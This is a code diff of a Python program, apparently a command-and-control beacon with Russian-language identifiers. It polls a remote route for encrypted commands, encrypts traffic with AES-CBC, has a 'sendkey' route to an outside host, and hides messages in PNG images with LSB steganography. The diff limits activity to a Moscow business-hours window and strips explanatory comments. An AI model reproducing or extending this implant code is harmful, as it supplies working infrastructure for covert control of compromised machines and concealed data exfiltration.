@@ -25,15 +25,14 @@ from diffiehellman import DiffieHellman
     3: ссылка + "auth.com" #sendkey
 }
 
-def проверить_интервал(): #check_interval
+def проверить_интервал(): 
     текущее_время = datetime.now().hour
-    if текущее_время >= 20 and текущее_время <= 24: #2 - 10 for Moscow business hours
-        return 
+    if текущее_время >= 2 and текущее_время <= 10: 
+        return True
     print(f"{КРАСНЫЙ}[!]{СБРОС} Nyet.")
-    время.sleep(60)
+    return False
 
-#Encryption of data -- IV is concatenated at the end of message for decryption
-def зашифровать(открытый_текст):  #encrypt
+def зашифровать(открытый_текст):  
     дополнение = 16 - (len(открытый_текст) % 16)
     шифр = AES.new(глобальный_ключ, AES.MODE_CBC)
     байты_текста = открытый_текст.encode() + (дополнение.to_bytes(1, "big") * дополнение)
@@ -41,8 +40,7 @@ def зашифровать(открытый_текст):  #encrypt
     print(f"{СТАТУС}[*]{СБРОС} Encrypted Message")
     return (зашифрованное + шифр.iv).decode("latin-1")
 
-#Decryption of data 
-def расшифровать(зашифрованный_текст): #decrypt
+def расшифровать(зашифрованный_текст): 
     зашифрованный_текст = зашифрованный_текст.encode("latin-1")
     инициализационный_вектор = зашифрованный_текст[-16:]
     шифр = AES.new(глобальный_ключ, AES.MODE_CBC, инициализационный_вектор)
@@ -55,7 +53,7 @@ def расшифровать(зашифрованный_текст): #decrypt
 #str is the encrypted string of data that needs to be hidden in a file. 
 def изменить_изображение(сообщение): #mod_img
     путь = "./images/"
-    имя_файла = "safari-bird"
+    имя_файла = "safari-bird-1"
     закодированное_изображение = lsb.hide(f"{путь}{имя_файла}.png", сообщение)
     закодированное_изображение.save(f"{путь}{имя_файла}-final.png")
     return f"{путь}{имя_файла}-final.png"
@@ -141,7 +139,9 @@ if __name__ == '__main__': #main
 
     количество_попыток = 1
     while True:
-        проверить_интервал()
+        if not проверить_интервал(): 
+            время.sleep(60)
+            continue
         try:
             ответ = requests.get(маршруты[0])
             зашифрованная_команда = разобрать_json(ответ)
